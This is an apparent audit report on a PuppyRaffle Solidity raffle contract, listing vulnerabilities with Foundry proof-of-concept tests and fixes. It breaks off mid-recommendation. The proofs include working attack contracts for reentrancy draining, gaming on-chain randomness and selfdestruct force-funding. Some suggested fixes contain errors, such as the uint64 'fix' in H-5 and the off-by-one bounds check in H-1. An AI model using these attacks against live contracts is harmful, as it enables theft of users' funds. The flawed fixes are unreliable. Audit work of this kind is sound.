### [H-1] A players address is replaced with the 0 address in the players array if they withdraw from the raffle and get a refund. This slot in the array can still be selected as the winner causing the `PuppyRaffle::selectWinner` function to revert. It also means that the prize pool and fee is incorrectly calculated, and that there can be less than 4 active players when a winner is selected.

**Description**
The players array contains a list of all the addresses that have entered the raffle. If any of the players withdraw from the raffle and get a refund, their slot in the array is replaced by the 0 address. 

**Issue 1: Incorrectly calculating the prize pool:** 
`PuppyRaffle::selectWinner`  doesn't check for refunded players when calculating prize pool and raffle fees, this means that too much funds are sent to the winner, or the select winner function reverts

```javascript 
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
```

**Impact:** 
If less than 20% of the players have got a refund, not enough funds are saved for the raffle fees
If more than 20% of the players have got a refund, the `PuppyRaffle::selectWinner` reverts when it tries to send funds.

**Proof of Concept:**

```javascript 
    function testPrizePoolAndRaffleFeesIncorrectlyCalculatedAfterRefunds()
        public
    {
        address[] memory newPlayers = new address[](6);
        newPlayers[0] = playerOne;
        newPlayers[1] = playerTwo;
        newPlayers[2] = playerThree;
        newPlayers[3] = playerFour;
        newPlayers[4] = playerFive;
        newPlayers[5] = playerSix;

        //all four players enter raffle
        puppyRaffle.enterRaffle{value: entranceFee * 6}(newPlayers);

        //Refund first player
        vm.prank(playerOne);
        puppyRaffle.refund(0);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assert(address(puppyRaffle).balance != (5 * entranceFee) / 20);
    }
```

**Issue 2:** 
The `PuppyRaffle::selectWinner` function selects an address from the array as the winner, and there is nothing stopping it from selecting the 0 addresses.

**Impact:** 
The function will always revert because the call function will always fail
```javascript
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

**Proof of Concept:**
```javascript
    function testRefundedWinnerCantReceiveFunds() public {
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = playerOne;
        newPlayers[1] = playerTwo;
        newPlayers[2] = playerThree;
        newPlayers[3] = playerFour;

        //all four players enter raffle
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);

        //Refund all players
        vm.prank(playerOne);
        puppyRaffle.refund(0);

        vm.prank(playerTwo);
        puppyRaffle.refund(1);

        vm.prank(playerThree);
        puppyRaffle.refund(2);

        vm.prank(playerFour);
        puppyRaffle.refund(3);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }
```

**Issue 3:** 
There can be less than 4 active players when a winner is selected if some users get a refund.

**Impact:** 
The require function in the `PuppyRaffle::selectWinner` function that checks for 4 addresses does not check to ensure there are four active addresses.

```javascript
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
```

**Proof of Concept:**

```javascript

    function testWinnerCanBeChosenWithLessThanFourActivePlayers() public {
        address[] memory newPlayers = new address[](4);
        newPlayers[0] = playerOne;
        newPlayers[1] = playerTwo;
        newPlayers[2] = playerThree;
        newPlayers[3] = playerFour;

        //all four players enter raffle
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);

        //Refund all players
        vm.prank(playerOne);
        puppyRaffle.refund(0);

        vm.prank(playerTwo);
        puppyRaffle.refund(1);

        vm.prank(playerThree);
        puppyRaffle.refund(2);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }

```

**Recommended Mitigation:** 

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerIndex <= players.length,
            "PuppyRaffle: Player is not active"
        );

        // Move the last element into the place to delete
        players[playerIndex] = players[players.length - 1];
        // Remove the last element
        players.pop();

        payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
    }
```









### [H-2] Contract state is changed after the payment is made, leaving the contract vulnerable to a reentrancy attack 

**Description:** 
The call function is made before the contract state is changed, leaving the contract vulnerable to a reentrancy attack. 

**Impact:** 

An attacker can create an attacking contract with a reentrancy attack and drain the PuppyRaffle contract.

**Proof of Concept:**

Add the following to the `PuppyRaffle::PuppyRaffleTest.t.sol` file.

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract ReentrancyAttack {
    PuppyRaffle public puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    constructor(address _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
    }

    // Starts the attack
    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfPlayer);
    }

    // Function to receive Ether
    receive() external payable {
        if (address(puppyRaffle).balance > 0) {
            uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(
                address(this)
            );
            puppyRaffle.refund(indexOfPlayer);
        }
    }
}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttack reentrancyAttack;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address playerFive = address(5);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        reentrancyAttack = new ReentrancyAttack(address(puppyRaffle));
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testReentrancyAttack() public playersEntered {
        address ATTACKER = address(reentrancyAttack);
        vm.deal(ATTACKER, 2 ether);

        uint256 balanceBefore = address(puppyRaffle).balance;
        vm.prank(ATTACKER);
        reentrancyAttack.attack();
        uint256 balanceAfter = address(puppyRaffle).balance;
        assert(balanceAfter < balanceBefore);
    }
}

```

**Recommended Mitigation:** 

Change the contracts state before the funds are sent. 

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(
            playerAddress == msg.sender,
            "PuppyRaffle: Only the player can refund"
        );
        require(
            playerAddress != address(0),
            "PuppyRaffle: Player already refunded, or is not active"
        );

        players[playerIndex] = address(0);

        payable(msg.sender).sendValue(entranceFee);
        
        emit RaffleRefunded(playerAddress);
    }
```



### [H-3] Randomness relies on known blockchain variables and can be gamed. Attackers can ensure they will win the raffle and receive the NFT. 

**Description:** 
All of the factors that are used to create a random number are known, the random number isn't random.

**Impact:** 
An attacker can create a smart contract that will be drawn as the winner and receive the NFT and prize pool.

**Proof of Concept:**

Add the following function to `PuppyRaffle`

```javascript
    function getPlayersLength() external view returns (uint256) {
        return players.length;
    }
    
    function getPreviousWinner() external view returns (address) {
        return previousWinner;
    }
```

Add the following file to your test folder.

```javascript 
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract BreakRandomnessFunction {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attackRandomness() public {
        uint256 playersLength = puppyRaffle.getPlayersLength();
        uint256 winnerIndex;
        uint256 numberOfPlayersToAdd = playersLength;
        while (true) {
            //used instead of for loop if we dont know how many iterations we need to do
            winnerIndex =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            address(this),
                            block.timestamp,
                            block.difficulty
                        )
                    )
                ) %
                numberOfPlayersToAdd;

            if (winnerIndex == playersLength) break;
            numberOfPlayersToAdd += 1;
        }
        uint256 toLoop = numberOfPlayersToAdd - playersLength;

        address[] memory playersToAdd = new address[](toLoop);
        playersToAdd[0] = address(this);
        for (uint256 i = 1; i < toLoop; ++i) {
            playersToAdd[i] = address(i + 100);
        }

        uint256 valueToSend = 1e18 * toLoop;

        puppyRaffle.enterRaffle{value: valueToSend}(playersToAdd);
        puppyRaffle.selectWinner();
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    BreakRandomnessFunction breakRandomnessFunction;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        breakRandomnessFunction = new BreakRandomnessFunction(puppyRaffle);
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testRandomnessAttack() public playersEntered {
        vm.deal(address(breakRandomnessFunction), 1000 ether);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        console.log(
            "Attacker balance before: ",
            address(breakRandomnessFunction).balance
        );
        breakRandomnessFunction.attackRandomness();
        console.log(
            "Attacker balance after: ",
            address(breakRandomnessFunction).balance
        );
        assert(
            puppyRaffle.getPreviousWinner() == address(breakRandomnessFunction)
        );
    }
}

```

**Recommended Mitigation:** 

Use Chainlink VRF 


### [H-5] Typecasting from unit256 to uint64 when calculating the contracts total fees can cause integer overflow breaking the `PuppyRaffle::withdrawFees` function 

**Description:** 
Typecasting of the fee variable in the `PuppyRaffle::selectWinner` function can cause integer overflow meaning the `totalFees` variable is incorrectly recorded.

```javascript
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
```

**Impact:** 

Overflow in the `totalFees` variable breaks the `PuppyRaffle::withdrawFees` function as it will always throw the error.

```javascript 
    function withdrawFees() external {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

**Proof of Concept:**

```javascript 
    function testTypecastingInFeeCalculation() public {
        PuppyRaffle typecastingPuppyRaffle;
        //should create error when 20% of total entranceFee exceeds uint64 max
        uint256 typecastingPuppyRaffleEntryFee = (type(uint64).max) / 2 + 1;
        typecastingPuppyRaffle = new PuppyRaffle(
            typecastingPuppyRaffleEntryFee,
            feeAddress,
            duration
        );
        address[] memory players = new address[](10);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        players[4] = playerFive;
        players[5] = playerSix;
        players[6] = address(7);
        players[7] = address(8);
        players[8] = address(9);
        players[9] = address(10);
        typecastingPuppyRaffle.enterRaffle{
            value: typecastingPuppyRaffleEntryFee * 10
        }(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        typecastingPuppyRaffle.selectWinner();

        uint256 totalAmountCollected = 10 * typecastingPuppyRaffleEntryFee;
        uint256 fee = (totalAmountCollected * 20) / 100;
        uint256 totalFees = uint64(fee);
        assert(totalFees != fee);
    }
```

**Recommended Mitigation:** 
Initialize `totalFees` variable as a uint256 instead of uint64

```javascript 
    uint64 public totalFees = 0;
```

Edit the `totalFee` calculation in the `PuppyRaffle::selectWinner` function.

```javascript 
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + fee;
```




### [H-6] Risk of integer underflow attacks without SafeMath and Solidity version earlier than 0.8.0

**Description:** 
Risk of integer underflow attacks without SafeMath and Solidity version earlier than 0.8.0

**Impact:** 
Incorrect variable calculation

**Proof of Concept:**
Add the following test to your test suite

```javascript

    function testIntegerOverflowUnderflow() public {
        uint256 OverflowUnderflowEntranceFee = (type(uint256).max) / 2 + 1;
        uint256 playersLength = 2;
        uint256 totalAmountCollected = playersLength *
            OverflowUnderflowEntranceFee;

        assert(OverflowUnderflowEntranceFee > totalAmountCollected);
    }
````
The `totalAmountCollected` should be double the size of `OverflowUnderflowEntranceFee`
But the test passes, showing `OverflowUnderflowEntranceFee` is greater than `totalAmountCollected`.


**Recommended Mitigation:** 

1. Utilize the OpenZeppelin SafeMath Function 

Import the relevant library
```javascript 
    import {SafeMath} from "@openzeppelin/contracts/math/SafeMath.sol";
```

Add the following line within the PuppyRaffle contract
```javascript 
    using SafeMath for uint256;
```

Use the safe math functions for multiplications and divisions
```javascript 
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);
```

2. Upgrade to Solidity version ^0.8.0 or later


### [H-7] Risk of front running attack in `PuppyRaffle::SelectWinner` and `PuppyRaffle::Refund` functions.

**Description:** 

Risk of front running attack in `PuppyRaffle::SelectWinner` and `PuppyRaffle::Refund` functions.

**Impact:** 

If the `PuppyRaffle::SelectWinner` function is called, and a player isn't selected as the winner, they can front run the payout transaction and request a refund. This means that they are at no loss for entering and losing the raffle. It will also impact the balance of the smart contract and could effect the ability to pay out the prize pool. If not, it will effect the ability for the Fee Address to withdraw fees. 

**Recommended Mitigation:** 

Introduce a state declaration.

Add the following into the contract.

```javascript
    enum RaffleState {
        OPEN,
        CALCULATING
    }

    RaffleState private s_raffleState;
```

Add to the constructor 
```javascript 
    constructor(
        uint256 _entranceFee,
        address _feeAddress,
        uint256 _raffleDuration
    ) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
        feeAddress = _feeAddress;
        raffleDuration = _raffleDuration;
        raffleStartTime = block.timestamp;
        s_raffleState = RaffleState.OPEN;
```

Add to the `PuppyRaffle::EnterRaffle` function
```javascript
        require(
            s_raffleState == RaffleState.OPEN, "PuppyRaffle: Raffle is not open"
        );
```
Add to the `PuppyRaffle::Refund` function  
```javascript 
        require(
            s_raffleState == RaffleState.OPEN, "PuppyRaffle: Raffle is calculating winner"
        );
```
Change the raffle state at the start of the `PuppyRaffle::SelectWinner` function
```javascript 
    function selectWinner() external {
        require(
            block.timestamp >= raffleStartTime + raffleDuration,
            "PuppyRaffle: Raffle not over"
        );
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        s_raffleState = RaffleState.CALCULATING;
```

Change the raffle state at the end of the `PuppyRaffle::SelectWinner` function after the players array has been reset.
```javascript 
        delete players;
        s_raffleState = RaffleState.OPEN;
```


### [M-1] Looping Through Players Array Multiple Times Which Increments Gas Costs for Raffle Entrants - Denial of Service Attack

**Description:** 
In the `PuppyRaffle::enterRaffle` function, we loop through the players array to check for duplicates. The number of iterations through the loop increases as the number of users in the raffle increases, therefore incrementing the gas fees for players to enter as the number of players increases. 

**Impact:** 
The more addresses that enter the raffle, the more it will cost for new entrants. Eventually the raffle will be too expensive to enter as the gas fees increase. 

```javascript
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(
                    players[i] != players[j],
                    "PuppyRaffle: Duplicate player"
                );
            }
        }
```

**Proof of Concept:**
Add the following to the `PuppyRaffle::PuppyRaffleTest.t.sol` file.

```javascript
    function testDenialOfService() public {
        address warmUpAddress = makeAddr("warmUp");

        address[] memory players = new address[](1);
        players[0] = warmUpAddress;
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        uint256 gasStartB = gasleft();
        address[] memory playersB = new address[](1);
        playersB[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(playersB);
        uint256 gasCostB = gasStartB - gasleft();

        uint256 gasStartC = gasleft();
        address[] memory playersC = new address[](1);
        playersC[0] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee}(playersC);
        uint256 gasCostC = gasStartC - gasleft();

        uint256 gasStartD = gasleft();
        address[] memory playersD = new address[](1);
        playersD[0] = playerThree;
        puppyRaffle.enterRaffle{value: entranceFee}(playersD);
        uint256 gasCostD = gasStartD - gasleft();

        // The gas cost will just keep rising, making it harder and harder for new people to enter!
        assert(gasCostD > gasCostC);
        assert(gasCostC > gasCostB);
    }
```


An attacker may enter with a huge amount of addresses so that the players array is big, discouraging other players from entering, and almost guaranteeing a win.

**Recommended Mitigation:** 

1. Remove functionality to stop duplicate entries. Since users can enter with multiple addresses, the same person can enter twice anyway
2. Use a mapping instead of the if loops.

```javascript
    mapping(address => uint256) public addressToRaffleID;
    uint256 public raffleID = 1;

    /// @notice this is how players enter the raffle
    /// @notice they have to pay the entrance fee * the number of players
    /// @notice duplicate entrants are not allowed
    /// @param newPlayers the list of players to enter the raffle
    function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );

        //Check no new players are duplicates 
        for (uint256 i = 0; i < newPlayers.length; i++) {
            require(
                addressToRaffleID[newPlayers[i]] != raffleID,
                "PuppyRaffle: Duplicate player"
            );
            players.push(newPlayers[i]);
            addressToRaffleID[newPlayers[i]] = raffleID;
        }
        emit RaffleEnter(newPlayers);
    }

    function selectWinner() external {
        raffleID++;
        ...
```




### [M-2] `PuppyRaffle::withdrawFees` checks if players are active by testing if `totalFees` is equal to the contract value. This breaks if funds are sent to the contract.

**Description:** 

The `PuppyRaffle::withdrawFees` checks if players are active by testing if `totalFees` is equal to the contracts value. This becomes impossible if funds are sent to the `PuppyRaffle` contract.

```javascript
    function withdrawFees() external {
        require(
            address(this).balance == uint256(totalFees),
            "PuppyRaffle: There are currently players active!"
        );
```

**Impact:** 
No fees can be withdrawn to the fee address.

**Proof of Concept:**

Add the following file to your test folder 

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract BreakWithdrawFeesFunction {
    address vulnerableAddress;

    constructor(address _vulnerableAddress) {
        vulnerableAddress = _vulnerableAddress;
    }

    function attack() public payable {
        address payable addr = payable(vulnerableAddress);
        selfdestruct(addr);
    }
}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    BreakWithdrawFeesFunction breakWithdrawFeesFunction;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        breakWithdrawFeesFunction = new BreakWithdrawFeesFunction(
            address(puppyRaffle)
        );
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testAttack() public playersEntered {
        address ATTACKER = address(breakWithdrawFeesFunction);
        vm.deal(ATTACKER, 2 ether);
        breakWithdrawFeesFunction.attack();

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

**Recommended Mitigation:** 

Allow `totalFees` to be withdrawn at any time since this does not count the active raffles


### [M-3] Call function is used to send winner their prize. This will fail if the winner is a smart contract without a `receive` or `fallback` function

**Description:** 
If a contract wins the raffle and does not have a `receive` or `fallback` function, the winner prize will not be able to be sent as the `PuppyRaffle::selectWinner`'s call function will always fail. 

**Impact:** 
The winning funds wont be able to be sent. 

**Proof of Concept:**

Add the following view function to `PuppyRaffle`

```javascript 
    function getPreviousWinner() public view returns (address) {
        return previousWinner;
    }
```

And create the following test file 

```javascript 
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract SmartContract {}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    SmartContract smartContract;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address playerFive = address(5);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        smartContract = new SmartContract();
    }

    function testSmartContractPickedAsWinner() public {
        address smartContractAddress = address(smartContract);

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = smartContractAddress;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    }
}
```

**Recommended Mitigation:** 

Ensure that only wallet addresses (externally owned accounts) can enter the raffle 
We can check if an address is a contract using the OpenZeppelin Address.sol contracts `Address::isAddress` function 
We can implement this into our `PuppyRaffle::enterRaffle` function

```javascript 
    function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );
        for (uint256 i = 0; i < newPlayers.length; i++) {
            require(Address.isContract(newPlayers[i]) == false, "The players need to be externally owned accounts");
            players.push(newPlayers[i]);
        }
```


### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for both the first player to enter the raffle and for players who are not in the raffle. This can lead to huge gas fees and incorrect refunds if the refund function is called before players have entered.



**Description:** 
`PuppyRaffle::getActivePlayerIndex` returns 0 for both the first player to enter the raffle and for players who are not in the raffle. 

**Impact:** 
If the refund function is called before a player enters the raffle it causes an EVM Error with high gas.

**Proof of Concept:**

Add the following test to the test suite

```javascript
    function testCallingRefundFunctionWithoutEnteringRaffle() public {
        uint256 index = puppyRaffle.getActivePlayerIndex(playerFive);
        vm.prank(playerFive);
        puppyRaffle.refund(index);
    }
```

Running the single test outputs

```javascript
Encountered 1 failing test in test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[FAIL. Reason: EvmError: Revert] testCallingRefundFunctionWithoutEnteringRaffle() (gas: 9079256848778899450)
```

Showing if a user calls the refund function before a player has been added to the raffle, it can cost a huge amount of gas (over 9 ETH).

**Recommended Mitigation:** 

Edit `PuppyRaffle::getActivePlayerIndex` function to increment all valid players index by 1. This means inactive players return 0 and active players return their index in players array plus one.

```javascript
    function getActivePlayerIndexPlusOne(
        address player
    ) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i + 1;
            }
        }
        return 0;
    }
```
Check the above function does not return zero before calculating the players index in the players array (-1) and continuing with the `PuppyRaffle::refund` function.

```javascript 
    function refund(uint256 playerIndexPlusOne) public {
        require(playerIndexPlusOne != 0, "PuppyRaffle: Player not found");
        uint256 playerIndex = playerIndexPlusOne - 1;
        address playerAddress = players[playerIndex];
```



### [L-2] Missing events after critical event changes which are useful for off-chain tracking

**Description:** 
Critical state changes should be recorded for tracking off-chain using events. 

**Impact:** 
Difficulty tracking off-chain

**Recommended Mitigation:** 

Add the following events to the contract 

```javascript
    event WinnerSelected(address winner);
    event FeesWithdrawn(address feeAddress, uint256 amount);
    event PuppyMinted(address winner, uint256 tokenId);
```

Add the emit functions within the `PuppyRaffle::selectWinner` function 

```javascript 


    function selectWinner() external {
        require(
            block.timestamp >= raffleStartTime + raffleDuration,
            "PuppyRaffle: Raffle not over"
        );
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex = uint256(
            keccak256(
                abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
            )
        ) % players.length;
        address winner = players[winnerIndex];
        emit WinnerSelected(winner);
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(
            keccak256(abi.encodePacked(msg.sender, block.difficulty))
        ) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
        emit PuppyMinted(winner, tokenId);
    }
```

Add the emit function within the `PuppyRaffle::withdrawFees` function 

```javascript 
    function withdrawFees() external {
        require(
            address(this).balance == uint256(totalFees),
            "PuppyRaffle: There are currently players active!"
        );
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
        emit FeesWithdrawn(feeAddress, feesToWithdraw);
    }
```

### [L-3] Incorrectly calculated rarity attributes

**Description:** 

There are 3 variables used to categorize the rarity of an NFT.

```javascript 
    uint256 public constant COMMON_RARITY = 70;
    uint256 public constant RARE_RARITY = 25;
    uint256 public constant LEGENDARY_RARITY = 5;
```

The following shows how rarity is defined within the `PuppyRaffle::selectWinner` function. 

```javascript 
        uint256 rarity = uint256(
            keccak256(abi.encodePacked(msg.sender, block.difficulty))
        ) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
```

The `rarity` variable will always be between 0 and 99 (inclusive)

`rarity` values between 0 and 70 are assigned `COMMON_RARITY`
`rarity` values between 71 and 95 are assigned `RARE_RARITY`
`rarity` values between 95 and 99 are assigned `LEGENDARY_RARITY`

This means there is:
71% chance of `COMMON_RARITY`
25% chance of `RARE_RARITY`
4% chance of `LEGENDARY_RARITY`

This is different to what is implied with the initial rarity variables

**Impact:** 
The chances of having the different rarities is different to what is expected

**Recommended Mitigation:** 

Change how rarity is defined within the `PuppyRaffle::selectWinner` function. 

```javascript 
        uint256 rarity = uint256(
            keccak256(abi.encodePacked(msg.sender, block.difficulty))
        ) % 100;
        if (rarity < COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity < COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
```

`rarity` values between 0 and 69 are assigned `COMMON_RARITY`
`rarity` values between 70 and 94 are assigned `RARE_RARITY`
`rarity` values between 95 and 99 are assigned `LEGENDARY_RARITY`

This means there is:
70% chance of `COMMON_RARITY`
25% chance of `RARE_RARITY`
5% chance of `LEGENDARY_RARITY`


### [L-4] `PuppyRaffle::SelectWinner` incorrectly checks to see if enough time has passed and can be called when the raffle is still active 

**Description:** 

The `PuppyRaffle::SelectWinner` function checks to see if enough time has passed by checking to see if the raffle start time plus the raffle duration is less than or equal to the current block timestamp. This should only check to see if the start time plus the raffle duration is less than the current block timestamp. 

The error is shown below.

```javascript

    function selectWinner() external {
        require(
            block.timestamp >= raffleStartTime + raffleDuration,
            "PuppyRaffle: Raffle not over"
        );
```

**Impact:** 

For example, if the current block time is 5, and the duration is 5 blocks, the raffle will run for blocks 6,7,8,9,10, and should be open for entry at block timestamp 10. If not, the winner can be selected whilst the raffle is active and may open a vulnerability for attackers. 

**Proof of Concept:**

Add the following test to your test suite

```javascript
    function testWinnersCanBeSelectedWhenRaffleIsStillActive()
        public
        playersEntered
    {
        uint256 start = 1;
        vm.warp(duration + 1);

        assert(block.timestamp == start + duration);
        puppyRaffle.selectWinner();
    }
```

**Recommended Mitigation:** 

Change from 'greater than or equal' to to just 'greater than'.

```javascript

    function selectWinner() external {
        require(
            block.timestamp > raffleStartTime + raffleDuration,
            "PuppyRaffle: Raffle not over"
        );
```


### [L-5] Susceptible to integer underflow attack of total entrance fee when entering multiple players into a contest.

**Description:** 
The total entry fee for an array of players is calculated as follows 

```javascript 
    function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );
    ...
```

**Impact:** 
If enough addresses are entered into the contest, there will be an integer underflow vulnerability and entry into the raffle will be free.

**Proof of Concept:**

Add the following to the test suite.

```javascript 
    function testCanEntryFeeBeManipulatedWithIntegerUnderflowAttack() public {
        PuppyRaffle overflowPuppyRaffle;
        uint256 overflowEntranceFee = type(uint256).max / 2 + 1;
        overflowPuppyRaffle = new PuppyRaffle(
            overflowEntranceFee,
            feeAddress,
            duration
        );
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;

        overflowPuppyRaffle.enterRaffle{value: 0}(players);
    }
```

**Recommended Mitigation:** 

1. Utilize the OpenZeppelin SafeMath Function 

Import the relevant library
```javascript 
